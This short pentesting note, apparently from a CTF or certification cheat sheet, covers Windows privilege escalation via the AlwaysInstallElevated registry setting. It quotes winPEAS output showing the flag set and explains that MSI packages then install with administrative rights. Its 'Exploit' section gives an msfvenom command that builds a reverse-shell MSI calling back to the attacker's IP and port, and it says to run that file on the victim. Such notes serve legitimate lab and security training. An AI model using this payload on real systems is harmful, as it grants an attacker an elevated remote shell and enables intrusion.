If winpeas shows this:
```
???????????? Checking AlwaysInstallElevated
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

This means that .msi files (Microsoft Software Installer) are automatically installed with Administrative privileges

#### Exploit
Create msfvenom rev shell and run on victim
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR tun0 IP> LPORT=<your_port> -f msi -o shell.msi
```